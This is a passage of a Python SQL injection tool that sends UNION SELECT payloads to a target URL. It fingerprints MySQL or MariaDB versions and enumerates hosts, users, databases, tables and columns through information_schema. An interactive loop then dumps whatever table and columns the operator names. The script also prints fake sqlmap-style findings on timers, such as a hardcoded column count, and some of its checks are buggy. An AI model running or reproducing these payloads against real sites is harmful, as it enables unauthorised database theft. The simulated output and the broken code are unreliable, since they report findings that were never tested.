                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                          if "MariaDB" in results_get_ver.text:
                                            print("web server operating system : Linux MariaDB")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                                

                                          print("[INFO] Starting Enumerate table name DBMS...")
                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',@@port))"
                                          get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                          results_get_user = requests.get(target_url + get_user)
                                          html_cont = results_get_user.text
                                          userss = r"\b\w+::\b"
                                          dump_all = re.findall(userss, html_cont)
                                          for user in dump_all:
                                              print("[-] Host name :", user)
                                              
                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',@@port))"
                                          get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                          results_get_user = requests.get(target_url + get_user)
                                          html_cont = results_get_user.text
                                          userss = r"\b\w+@\b\w+::\b"
                                          dump_all = re.findall(userss, html_cont)
                                          for user in dump_all:
                                              print("operating Enumerate: ")
                                              print("web server operating user mysql :", user)
                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',@@port))"
                                          get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                          results_get_dbs = requests.get(target_url + get_dbs)
                                          html_cont = results_get_dbs.text
                                          databs = r"\b\w+::\b"
                                          dump_dbase = re.findall(databs, html_cont)
                                          for dbs in dump_dbase:
                                              print("web server operating Database 1 :", dbs)
                                              print("web server operating Database 2 : information_schema")
                                              print("--------")
                                              print("[INFO] Found 2 table database :")
                                              print("[+]", dbs)
                                              print("[+] information_schema")
                                              print("")
                                          print("[INFO] Starting Enumerate DBMS table name...")
                                          payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                          rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                          results_get_queries = requests.get(target_url + rm)
                                          html_cont = results_get_queries.text
                                          dbms = r"\b\w+::\b\w+::\b"
                                          database_all = re.findall(dbms, html_cont)
                                          print("Blind tables name")
                                          print("Dump DBS : {}".format(dbs))
                                          print("------------------")
                                          print("| table | column |")
                                          print("------------------")
                                          num_table = 0
                                          for database_table in database_all:
                                              num_table += 1
                                              print(f"[INFO] fetching database on {dbs} -->", database_table)
                                              time.sleep(0.30)
                                          print(f"[+] Found {num_table} Tables Name....")
                                          time.sleep(1)
                                          print("--------------------------")
                                          print("Table Name | Columns Name")
                                          print("--------------------------")
                                          for database in database_all:
                                              print(f"[+] {database} --> ", dbs, user)
                                              time.sleep(0.10)
                                          print('------------------------------------------------------------------------------')
                                          print(database_all)
                                          print('-------------------------------------------------------------------------------')
                                          print("")
                                          print("You Readly Dump Database Tables ? :")
                                          while True:
                                              print("")
                                              text_dump = input("Name Tables : ")
                                              text_dump2 = input("Name Columns : ")
                                              modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',@@port+SEPARATOR+'<br>')+FROM+{text_dump})"
                                              payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
                                              results_dump = requests.get(target_url + payload_dump)
                                              texts_html = results_dump.text
                                              checking_data = r"\b\w+::\b"
                                              data_all = re.findall(checking_data, texts_html)
                                              for data in data_all:
                                                  print("+-----------------------------------------------------+"
                                                  print(f"[+] | {text_dump} | {text_dump2} | {dbs} |=> ", data)
                                                  print("+-----------------------------------------------------+")
                                          exit()
                                      else:
                                          pass
                                      

  # =============================================================================================================================
  #                                       Payload %27 
                  else:
                      print("[INFO] payload UNION basic not valid vulnerable...")
                      time.sleep(0.50)
                      print("[INFO] Starting Random Payload to check Target...")
                      time.sleep(1)
                      print("[INFO] Testing 'UNION SELECT NUMBER COUNT COLUMNS (MySQL Select).'")
                      payloads_1 = [
                         "%27+AND+0+UNION+SELECT+1,2--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-",
                         "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-",
                      ]
                      count_num = 1
                      print("[INFO] testing connection to the target URL")
                      time.sleep(1)
                      print("[INFO] testing if the target URL content is stable")
                      time.sleep(1.5)
                      print("[INFO] target URL content is stable")
                      time.sleep(0.50)
                      print("[INFO] testing if GET parameter 'id' is dynamic")
                      time.sleep(3)
                      print("[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')")
                      time.sleep(2)
                      print("[INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks")
                      time.sleep(1)
                      print("[INFO] testing for SQL injection on GET parameter 'id'")
                      time.sleep(0.30)
                      print("[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'")
                      time.sleep(0.90)
                      print("[WARNING] reflective value(s) found and filtering out")
                      time.sleep(0.100)
                      print("[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string='BS')")
                      time.sleep(0.20)
                      print("[INFO] testing 'Generic inline queries'")
                      time.sleep(0.10)
                      print("[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'")
                      time.sleep(2)
                      print("[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'")
                      time.sleep(1.5)
                      print("[INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'")
                      time.sleep(1.2)
                      print("[INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'")
                      time.sleep(2)
                      print("[INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'")
                      time.sleep(0.50)
                      print("[INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'")
                      time.sleep(0.50)
                      print("[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'")
                      time.sleep(0.50)
                      print("[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable")
                      time.sleep(1)
                      print("[INFO] testing 'MySQL inline queries'")
                      time.sleep(1)
                      print("[INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found")
                      time.sleep(1)
                      print("[INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test")
                      time.sleep(1)
                      print("[INFO] target URL appears to have 11 columns in query")
                      time.sleep(1)
                      print("[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable")
                      for payload in payloads_1:
                          count_num += 1
                          results = requests.get(target_url + payload)
                          if results.status_code == 200:
                              if "The used SELECT" and "The used SELECT statements have a different number of columns" in results.text:
                                  pass
                              else:
                                  print("[INFO] Found Columns - (Number Count) - {}".format(count_num))
                                  print(f'''
  GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)
  sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
  ---
  Parameter: id (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: ' AND 6847=6847 AND 'XvUz'='XvUz

      Type: error-based
      Title: MySQL >= AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: ' AND (SELECT 4239 FROM(SELECT COUNT(*),CONCAT(0x71787a7871,(SELECT (ELT(4239=4239,1))),0x7170706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Knwb'='Knwb

      Type: time-based blind
      Title: MySQL >= AND time-based blind (query SLEEP)
      Payload: ' AND (SELECT 7342 FROM (SELECT(SLEEP(5)))rKZp) AND 'zqte'='zqte

      Type: UNION query
      Title: Generic UNION query (NULL) - {count_num} columns
      Payload: {payload}
  ---
  ''')
                                  time.sleep(1)
                                  print("[INFO] The back-end DBMS is MySQLi")
                                  numss = count_num
                                  nums = [numss for numss in range(3, numss+1)]
                                  for num_countss in nums:
                                      payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                      get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                      results_get_dbs = requests.get(target_url + get_dbs)
                                      html_cont = results_get_dbs.text
                                      databs = r"\b\w+::\b"
                                      dump_dbase = re.findall(databs, html_cont)
                                      payload_check_count = str(dump_dbase)
                                      results = requests.get(target_url + payload_check_count)
                                      if str(num_countss) and "::" in results.text:
                                          print("Columns Found : {}".format(num_countss))
                                          payloads_ver_1 = "version()"
                                          version_payload = re.sub(r"\b{}\b".format(num_countss), payloads_ver_1, payload)
                                          
                                          results_get_ver = requests.get(target_url + version_payload)
                                          print("back-end MySQL: ")
                                          if "5.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.0.12 ")
                                          if "5.0.12" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.0.12 ")
                                          if "5.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.1 ")
                                          if "5.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.2 ")
                                          if "5.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.3 ")
                                          if "5.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.4 ")
                                          if "5.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.5 ")
                                          if "5.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.6")
                                          if "5.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.7 ")
                                          if "5.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.8 ")
                                          if "5.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.9 ")
                                          if "5.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 5.10 ")
                                          if "6.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.0 ")
                                          if "6.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.1 ")
                                          if "6.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.2 ")
                                          if "6.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.3 ")
                                          if "6.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.4 ")
                                          if "6.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.5 ")
                                          if "6.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.6 ")
                                          if "6.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.7 ")
                                          if "5.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.8 ")
                                          if "5.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.9 ")
                                          if "6.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 6.10 ")
                                          if "7.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.0 ")
                                          if "7.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.1 ")
                                          if "7.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.2 ")
                                          if "7.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.3 ")
                                          if "7.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.4  ")
                                          if "7.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.5  ")
                                          if "7.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.6 ")
                                          if "7.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.7  ")
                                          if "7.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.8  ")
                                          if "7.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.9  ")
                                          if "7.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 7.10  ")
                                          if "8.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >=  8.0")
                                          if "8.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.1 ")
                                          if "8.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.2 ")
                                          if "8.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.3")
                                          if "8.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.4 ")
                                          if "8.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.5 ")
                                          if "8.6" in results_get_ver.text:
